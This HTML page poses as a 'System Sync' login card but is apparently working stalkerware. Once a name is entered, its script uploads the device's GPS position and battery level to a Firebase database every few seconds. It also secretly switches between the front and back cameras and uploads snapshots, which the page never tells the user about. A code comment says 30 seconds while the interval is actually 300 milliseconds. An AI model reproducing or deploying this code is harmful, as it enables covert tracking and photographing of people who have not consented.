<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User - Live Tracker</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1a202c; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #2d3748; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #4a5568; }
        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 10px; border: 1px solid #4a5568; font-size: 16px; box-sizing: border-box; background: #1a202c; color: white; outline: none; }
        input:focus { border-color: #38a169; }
        .btn { background: #38a169; color: white; border: none; padding: 12px; border-radius: 10px; width: 100%; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
        .btn:hover { background: #2f855a; }
        .status { margin-top: 15px; color: #68d391; font-size: 14px; display: none; font-weight: bold; }
        #bat-val { font-size: 18px; margin-top: 10px; color: #cbd5e0; }
        .warning { font-size: 12px; color: #f56565; margin-top: 10px; display: none; }
    </style>
</head>
<body>

    <audio id="startSnd" src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3" preload="auto"></audio>

    <div class="card">
        <h2 style="color: #63b3ed; margin-top: 0;">System Sync üìç</h2>
        <div id="setup">
            <input type="text" id="userName" placeholder="Apna Naam Likhein...">
            <button class="btn" onclick="startTracking()">Connect to Server</button>
            <p style="font-size: 11px; color: #a0aec0; margin-top: 10px;">Keep Internet & GPS On</p>
        </div>
        
        <div id="active" style="display:none;">
            <h3 id="name-tag" style="margin-bottom: 5px;"></h3>
            <div class="status" id="status-box">üü¢ System Live & Syncing...</div>
            <p id="bat-val">Battery: --% üîã</p>
            <p style="font-size: 12px; color: #a0aec0;">Is page ko band mat karein</p>
            <div id="gps-error" class="warning">‚ö†Ô∏è GPS Blocked! Setting se Allow karein.</div>
        </div>
    </div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCZz90P8npkRcL0ZctIelDFbKRN48BsZzk",
        authDomain: "tracking-7494e.firebaseapp.com",
        projectId: "tracking-7494e",
        storageBucket: "tracking-7494e.firebasestorage.app",
        messagingSenderId: "861816870090",
        appId: "1:861816870090:web:4dec49659b3806fcd49033"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    db.settings({ cacheSizeBytes: firebase.firestore.CACHE_SIZE_UNLIMITED });

    let current_id = "";
    let useFrontCamera = true; // Camera switch karne ke liye logic

    async function pushData(lat, lng) {
        let bat = 0;
        try { 
            const b = await navigator.getBattery(); 
            bat = Math.floor(b.level * 100); 
        } catch(e) {}
        
        document.getElementById('bat-val').innerText = `Battery: ${bat}% üîã`;

        db.collection("locations").doc(current_id).set({
            userName: current_id,
            lat: Number(lat),
            lng: Number(lng),
            battery: bat,
            lastUpdate: firebase.firestore.FieldValue.serverTimestamp()
        }, { merge: true });
    }

    // Photo Capture Logic (Dual Camera - Free Base64)
    async function capturePhoto() {
        if (!current_id) return;
        
        const video = document.createElement('video');
        const canvas = document.createElement('canvas');
        
        // Mode switch: "user" (Front) aur "environment" (Back)
        const cameraMode = useFrontCamera ? "user" : "environment";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: cameraMode } 
            });
            video.srcObject = stream;
            await video.play();

            // Quality low taaki Free Firestore limit cross na ho
            canvas.width = 300; 
            canvas.height = 225;
            canvas.getContext('2d').drawImage(video, 0, 0, 300, 225);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.3); 
            
            db.collection("locations").doc(current_id).update({
                userPhoto: photoData,
                camMode: useFrontCamera ? "Front Camera" : "Back Camera",
                lastPhotoTime: new Date().toLocaleTimeString()
            });

            stream.getTracks().forEach(track => track.stop());
            
            // Agli baar camera badalne ke liye toggle karein
            useFrontCamera = !useFrontCamera;
            console.log("Photo Captured from: " + cameraMode);
            
        } catch (err) {
            console.log("Camera Blocked or Error:", err);
            // Agar ek camera block ho toh switch karke try karein
            useFrontCamera = !useFrontCamera;
        }
    }

    function startTracking() {
        const n = document.getElementById('userName').value.trim();
        if(!n) return alert("Naam likho bhai!");
        
        current_id = n;
        document.getElementById('startSnd').play().catch(e => {});

        document.getElementById('setup').style.display = 'none';
        document.getElementById('active').style.display = 'block';
        document.getElementById('status-box').style.display = 'block';
        document.getElementById('name-tag').innerText = "Hi, " + n;

        if (navigator.geolocation) {
            const success = (p) => {
                document.getElementById('gps-error').style.display = 'none';
                pushData(p.coords.latitude, p.coords.longitude);
            };

            const error = (err) => {
                document.getElementById('gps-error').style.display = 'block';
            };

            navigator.geolocation.watchPosition(success, error, { enableHighAccuracy: true });

            // Force Location Sync every 5 seconds
            setInterval(() => {
                navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true });
            }, 5000);

            // Start Photo Sync (Every 30 seconds - Baari baari Front/Back)
            capturePhoto(); 
            setInterval(capturePhoto, 300);

        } else {
            alert("GPS support nahi hai!");
        }
    }
</script>
</body>
</html>
